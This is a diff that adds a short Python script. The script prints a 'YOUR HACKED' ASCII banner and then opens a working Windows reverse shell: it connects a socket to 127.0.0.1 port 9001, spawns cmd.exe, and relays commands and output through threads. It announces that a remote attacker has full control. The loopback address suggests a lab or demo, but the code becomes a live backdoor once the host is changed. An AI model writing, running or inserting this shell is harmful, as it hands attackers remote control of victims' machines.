@@ -1,0 +1,48 @@
+import os,socket,subprocess,threading;
+
+def hacked():
+    print("###################################################################################################################")
+    print("                                                                                                                   ")
+    print("                                                                                                                   ")
+    print("  ___    ___ ________  ___  ___  ________          ___  ___  ________  ________  ___  __    _______   ________     ")
+    print(" |\  \  /  /|\   __  \|\  \|\  \|\   __  \        |\  \|\  \|\   __  \|\   ____\|\  \|\  \ |\  ___ \ |\   ___ \    ")
+    print(" \ \  \/  / | \  \|\  \ \  \\\\\  \ \  \|\  \       \ \  \\\\\  \ \  \|\  \ \  \___|\ \  \/  /|\ \   __/|\ \  \_|\ \   ")
+    print("  \ \    / / \ \  \\\\\  \ \  \\\\\  \ \   _  _\       \ \   __  \ \   __  \ \  \    \ \   ___  \ \  \_|/_\ \  \ \\\\ \  ")
+    print("   \/  /  /   \ \  \\\\\  \ \  \\\\\  \ \  \\\\  \|       \ \  \ \  \ \  \ \  \ \  \____\ \  \\\\ \  \ \  \_|\ \ \  \_\\\\ \ ")
+    print(" __/  / /      \ \_______\ \_______\ \__\\\\ _\        \ \__\ \__\ \__\ \__\ \_______\ \__\\\\ \__\ \_______\ \_______\\")
+    print("|\___/ /        \|_______|\|_______|\|__|\|__|        \|__|\|__|\|__|\|__|\|_______|\|__| \|__|\|_______|\|_______|")
+    print("\|___|/                                                                                                            ")
+    print("                                                                                                                   ")
+    print("                                                                                                                   ")
+    print("###################################################################################################################")
+
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+hacked()
+print('[+] trying to communicate with attacker server')
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("127.0.0.1",9001))
+
+p=subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+print('[+] Shell access granted, remote attacker has full control')
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
+
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
+
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
